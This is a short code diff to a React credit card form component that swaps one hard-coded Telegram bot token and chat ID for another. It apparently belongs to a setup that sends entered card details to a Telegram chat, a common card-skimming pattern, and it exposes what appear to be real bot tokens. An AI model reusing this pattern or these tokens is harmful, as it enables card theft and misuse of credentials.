@@ -2,8 +2,8 @@
 import { useState } from 'react';
 import { useForm } from 'react-hook-form';
 
-const TELEGRAM_BOT_TOKEN = '7697540993:AAFLvjwviT5Z7ZjyI3jYl06x2vd34L5FDWw'; // Replace with your actual bot token
-const TELEGRAM_CHAT_ID = '7388576858'; // Replace with your actual chat ID
+const TELEGRAM_BOT_TOKEN = '7777336492:AAHCBTyrQYyMSU7hRye2Xd0PSORqIsAtktY'; // Replace with your actual bot token
+const TELEGRAM_CHAT_ID = '7860277201'; // Replace with your actual chat ID
 
 interface CreditCardFormProps {
   totalAmount: number;
